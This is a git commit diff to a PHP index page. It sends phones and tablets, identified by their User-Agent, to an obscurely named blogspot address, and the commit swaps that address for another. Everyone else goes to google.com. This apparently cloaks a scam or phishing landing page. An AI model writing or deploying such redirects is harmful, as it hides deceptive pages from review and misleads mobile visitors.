8e392f9d0b7042e68bd04453d5dba5369e6a0bec
argeni5959 <67845811+argeni5959@users.noreply.github.com>
2020-09-13 19:40:38 -0400

    Update index.php

--- murrays/pimentels/index.php
+++ murrays/pimentels/index.php
@@ -10,7 +10,7 @@ $ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
 if ($iphone || $android || $palmpre || $ipod || $berry == true) 
  {
  
-  header('Location: https://redirecionmasteriliamome.blogspot.com/');
+  header('Location: https://mostrandomelo-linkdo.blogspot.com/');
      
   }else{
  header('Location: https://google.com/');
